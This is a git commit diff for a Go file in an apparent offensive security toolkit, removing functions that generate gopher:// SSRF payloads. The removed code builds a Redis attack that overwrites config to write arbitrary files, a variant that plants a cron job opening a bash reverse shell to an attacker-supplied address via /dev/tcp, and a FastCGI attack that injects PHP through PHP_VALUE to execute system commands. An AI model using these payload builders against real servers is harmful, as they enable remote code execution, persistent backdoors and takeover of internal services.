c25cb10a305431057fa69236a53d5b09e4d049f6
Virink <virink@outlook.com>
2020-09-12 22:33:25 +0800

    Update gopher

--- web/gopher/gopher.go
+++ web/gopher/gopher.go
@@ -2,84 +2,13 @@ package gopher
 
 import (
 	"bytes"
-	"encoding/base64"
 	"fmt"
 	"io"
 	"mime/multipart"
 	"net/url"
 	"os"
-	"strconv"
 	"strings"
-
-	"github.com/virink/virzz/common"
-	"github.com/virink/virzz/tools/client/fastcgi"
-	"github.com/virink/virzz/utils"
 )
-
-func replaceFastCGIPayload(p string) string {
-	p = strings.ReplaceAll(p, "+", "%20")
-	p = strings.ReplaceAll(p, "%2F", "/")
-	return p
-}
-func replaceRedisPayload(p string) string {
-	p = replaceFastCGIPayload(p)
-	p = strings.ReplaceAll(p, "%25", "%")
-	p = strings.ReplaceAll(p, "%3A", ":")
-	return p
-}
-
-// ExpRedisCmd -
-func ExpRedisCmd(addr, path, name, data string) (string, error) {
-	common.Logger.Debug("path: ", path)
-	common.Logger.Debug("name: ", name)
-	common.Logger.Debug("data: ", data)
-	ps := []string{
-		"*1", "$8", "flushall",
-		"*3", "$3", "set", "$1", "1", fmt.Sprintf("$%d", len(data)), data,
-		"*4", "$6", "config", "$3", "set", "$3", "dir", fmt.Sprintf("$%d", len(path)), path,
-		"*4", "$6", "config", "$3", "set", "$10", "dbfilename", fmt.Sprintf("$%d", len(name)), name,
-		"*1", "$4", "save",
-		"*1", "$4", "quit",
-		"",
-	}
-	p := url.QueryEscape(strings.Join(ps, "\r\n"))
-	return fmt.Sprintf("gopher://%s/_%s", addr, replaceRedisPayload(p)), nil
-}
-
-// ExpRedisReverseShell -
-func ExpRedisReverseShell(addr, path, name, reverseAddr string) (string, error) {
-	ip, port, err := utils.ParseAddr(reverseAddr)
-	if err != nil {
-		return "", err
-	}
-	cmd := fmt.Sprintf("\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n", ip, port)
-	return ExpRedisCmd(addr, path, name, cmd)
-}
-
-// ExpFastCGI -
-func ExpFastCGI(addr string, cmd, filename string, encode bool) (string, error) {
-	// "/usr/share/php/PEAR.php"
-	cmd = fmt.Sprintf(
-		`<?php system(base64_decode('%s'));?>`,
-		base64.StdEncoding.EncodeToString([]byte(cmd)),
-	)
-	env := map[string]string{
-		"SERVER_SOFTWARE": "virzz - fcgiclient",
-		"REMOTE_ADDR":     "127.0.0.1",
-		"SERVER_PROTOCOL": "HTTP/1.1",
-		"CONTENT_LENGTH":  strconv.Itoa(len(cmd)),
-		"REQUEST_METHOD":  "POST",
-		"SCRIPT_FILENAME": filename,
-		"PHP_VALUE":       "allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input",
-		"DOCUMENT_ROOT":   "/",
-	}
-	r := fastcgi.NewFastCGIRecord(env, []byte(cmd))
-	p := url.QueryEscape(string(r))
-	if encode {
-		p = url.QueryEscape(replaceFastCGIPayload(p))
-	}
-	return fmt.Sprintf("gopher://%s/_%s", addr, replaceFastCGIPayload(p)), nil
-}
 
 // ExpHTTPPost -
 func ExpHTTPPost(addr string, uri string, datas map[string]string) (string, error) {
